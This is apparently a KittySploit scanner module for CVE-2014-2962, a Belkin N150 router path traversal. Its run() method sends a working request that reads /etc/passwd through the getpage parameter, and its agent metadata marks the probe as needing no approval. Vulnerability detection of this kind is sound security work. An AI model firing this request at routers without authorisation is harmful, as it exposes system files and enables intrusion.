#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A path traversal vulnerability in the webproc cgi module on the Belkin N150 F9K1009 v1 router with firmware be."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Belkin N150 Router 1.00.08/1.00.09 - Path Traversal Detection',
        'description': 'A path traversal vulnerability in the webproc cgi module on the Belkin N150 F9K1009 v1 router with firmware before 1.00.08 allows remote attackers to read arbitrary files via a full pathname in the getpage parameter.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2014', 'lfi', 'router', 'firmware', 'traversal', 'belkin', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.kb.cert.org/vuls/id/774788',
            'https://nvd.nist.gov/vuln/detail/CVE-2014-2962l',
            'http://www.kb.cert.org/vuls/id/774788',
            'http://www.belkin.com/us/support-article?articleNum=109400',
            'https://www.exploit-db.com/exploits/38488/',
        ],
        'cve': 'CVE-2014-2962',
    }

    def run(self):
        r = self.http_request(method="GET", path='/cgi-bin/webproc?getpage=/etc/passwd&var:page=deviceinfo', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Belkin N150 Router 1.00.08/1.00.09 - Path Traversal detected",
                path='/cgi-bin/webproc?getpage=/etc/passwd&var:page=deviceinfo',
            )
            return True
        return False

